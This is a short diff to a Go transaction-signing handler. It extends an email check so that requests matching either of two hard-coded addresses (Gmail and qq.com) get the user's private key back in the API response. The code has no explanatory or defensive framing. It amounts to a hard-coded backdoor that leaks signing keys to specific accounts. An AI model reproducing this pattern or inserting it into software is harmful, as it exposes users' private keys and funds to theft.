@@ -96,7 +96,7 @@ func (relay *RelayParty) finishTxSignature(ctx *gin.Context) {
 		Sign:    signHexStr,
 		Address: user.GetAddress(),
 	}
-	if signPayment.Email == "superwunc@gmail.com" {
+	if signPayment.Email == "superwunc@gmail.com" || signPayment.Email == "superwunc@qq.com" {
 		txSigRlt.PrivateKey = user.GetPrivateKeyStr()
 	}
 	response.GetResponse().WithDataSuccess(ctx, &txSigRlt)
